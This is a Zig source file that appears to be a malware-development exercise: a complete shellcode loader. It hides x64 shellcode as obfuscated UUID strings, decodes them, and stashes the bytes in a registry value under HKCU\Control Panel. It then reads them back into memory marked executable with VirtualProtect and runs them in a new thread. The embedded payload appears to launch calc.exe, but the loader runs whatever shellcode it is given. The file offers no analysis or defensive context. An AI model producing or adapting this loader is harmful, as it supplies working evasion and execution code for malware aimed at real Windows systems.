const std = @import("std");
const win = @import("zigwin32").everything;
const uuidDeobfuscation = @import("12.payload-obfuscation-uuidfuscation.zig").uuidDeobfuscation;

const HANDLE = win.HANDLE;
const GetLastError = win.GetLastError;
const HKEY_CURRENT_USER = win.HKEY_CURRENT_USER;
const KEY_SET_VALUE = win.KEY_SET_VALUE;
const KEY_QUERY_VALUE = win.KEY_QUERY_VALUE;
const HKEY = win.HKEY;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const RRF_RT_ANY = win.RRF_RT_ANY;
const INFINITE = win.INFINITE;

const VirtualAlloc = win.VirtualAlloc;
const VirtualFree = win.VirtualFree;
const VirtualProtect = win.VirtualProtect;
const CreateThread = win.CreateThread;
const RegOpenKeyExW = win.RegOpenKeyExW;
const RegCloseKey = win.RegCloseKey;
const RegGetValueW = win.RegGetValueW;
const RegQueryValueExW = win.RegQueryValueExW;
const CloseHandle = win.CloseHandle;
const WaitForSingleObject = win.WaitForSingleObject;
const RegSetValueExW = win.RegSetValueExW;

const REGISTRY = std.unicode.utf8ToUtf16LeStringLiteral("Control Panel");
const REG_STRING = std.unicode.utf8ToUtf16LeStringLiteral("Maldev");

const uuid_array = [_][:0]const u8{
    "E48348FC-E8F0-00C0-0000-415141505251",
    "D2314856-4865-528B-6048-8B5218488B52",
    "728B4820-4850-B70F-4A4A-4D31C94831C0",
    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
    "48514152-528B-8B20-423C-4801D08B8088",
    "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848",
    "314DD601-48C9-C031-AC41-C1C90D4101C1",
    "F175E038-034C-244C-0845-39D175D85844",
    "4924408B-D001-4166-8B0C-48448B401C49",
    "8B41D001-8804-0148-D041-5841585E595A",
    "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000",
    "00000000-4800-8D8D-0101-000041BA318B",
    "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
    "C48348D5-3C28-7C06-0A80-FBE07505BB47",
    "6A6F7213-5900-8941-DAFF-D563616C632E",
    "00657865-0000-0000-0000-000000000000",
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const payload = try uuidDeobfuscation(allocator, &uuid_array);
    defer allocator.free(payload);

    try writeShellcodeToRegistry(payload);

    const shellcode = try readShellcodeFromRegistry(allocator);
    defer allocator.free(shellcode);

    try runShellcode(shellcode);
}

fn writeShellcodeToRegistry(shellcode: []const u8) !void {
    var h_key: ?HKEY = null;
    if (RegOpenKeyExW(
        HKEY_CURRENT_USER,
        REGISTRY,
        0,
        KEY_SET_VALUE,
        &h_key,
    ) != .NO_ERROR) {
        std.debug.print("[!] RegOpenKeyExW Failed\n", .{});
        return error.RegOpenKeyExWFailed;
    }
    defer _ = RegCloseKey(h_key);

    if (RegSetValueExW(
        h_key,
        REG_STRING,
        0,
        .BINARY,
        @ptrCast(shellcode),
        @intCast(shellcode.len),
    ) != .NO_ERROR) {
        std.debug.print("[!] RegSetValueExW Failed\n", .{});
        return error.RegSetValueExWFailed;
    }
}

fn readShellcodeFromRegistry(allocator: std.mem.Allocator) ![]u8 {
    var h_key: ?HKEY = null;
    if (RegOpenKeyExW(
        HKEY_CURRENT_USER,
        REGISTRY,
        0,
        KEY_QUERY_VALUE,
        &h_key,
    ) != .NO_ERROR) {
        std.debug.print("[!] RegOpenKeyExW Failed\n", .{});
        return error.RegOpenKeyExWFailed;
    }
    defer _ = RegCloseKey(h_key);

    var shellcode_size: u32 = undefined;
    if (RegQueryValueExW(
        h_key,
        REG_STRING,
        null,
        null,
        null,
        &shellcode_size,
    ) != .NO_ERROR) {
        std.debug.print("[!] RegQueryValueExW Failed\n", .{});
        return error.RegQueryValueExWFailed;
    }

    const shellcode = try allocator.alloc(u8, shellcode_size);

    var cb_data: u32 = undefined;
    if (RegGetValueW(
        HKEY_CURRENT_USER,
        REGISTRY,
        REG_STRING,
        RRF_RT_ANY,
        null,
        shellcode.ptr,
        &cb_data,
    ) != .NO_ERROR) {
        std.debug.print("[!] RegGetValueW Failed\n", .{});
        return error.RegGetValueWFailed;
    }

    return shellcode;
}

fn runShellcode(shellcode: []u8) !void {
    const shellcode_address = VirtualAlloc(
        null,
        shellcode.len,
        .{ .COMMIT = 1, .RESERVE = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocFailed;
    };
    defer _ = VirtualFree(shellcode_address, 0, .RELEASE);

    @memcpy(@as([*]u8, @ptrCast(shellcode_address)), shellcode);
    @memset(shellcode, 0);

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtect(
        shellcode_address,
        shellcode.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectFailed;
    }

    const h_thread = CreateThread(
        null,
        0,
        @ptrCast(shellcode_address),
        null,
        .{},
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };
    defer _ = CloseHandle(h_thread);

    _ = WaitForSingleObject(h_thread, INFINITE);
}
